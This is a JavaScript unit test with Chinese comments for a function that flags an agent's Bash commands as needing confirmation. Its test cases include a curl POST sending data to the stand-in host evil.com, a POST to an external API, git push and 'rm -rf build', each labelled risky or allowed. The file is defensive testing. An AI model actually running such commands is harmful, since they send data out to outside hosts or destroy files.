// 风险判断单测：从 bin/inkwatch.mjs 抠出 RISKY..riskOf 这一段直接跑
import fs from 'node:fs'
const src = fs.readFileSync(new URL('../bin/inkwatch.mjs', import.meta.url), 'utf8')
const part = src.slice(src.indexOf('const RISKY'), src.indexOf('// ------------------------------------------------------------------ 把事件翻成'))
const riskOf = new Function(part + '; return riskOf')()
const stuck = `cd "/x/report"; python3 -c "
import json" | head -4; K(){ curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/json' -d "$1"; }; K '{"a":1}'`
const cases = [
  ['本机浏览器桥（之前卡住的那条）', stuck, false],
  ['curl POST 到 localhost', `curl -X POST http://localhost:3000/api -d '{}'`, false],
  ['curl POST 到外网', `curl -X POST https://api.example.com/x -d '{}'`, true],
  ['curl POST 本机+外网混着', `curl -X POST http://127.0.0.1:1/a -d x && curl -d y https://evil.com`, true],
  ['curl POST 网址在变量里', `curl -X POST "$URL" -d x`, true],
  ['git push', `git push origin main`, true],
  ['rm -rf', `rm -rf build`, true],
  ['普通 python', `python3 x.py`, false],
]
let bad = 0
for (const [name, cmd, want] of cases) {
  const got = !!riskOf('Bash', { command: cmd })
  if (got !== want) bad++
  console.log(got === want ? 'ok  ' : 'FAIL', name, '→', got ? '要确认' : '放行')
}
process.exit(bad ? 1 : 0)
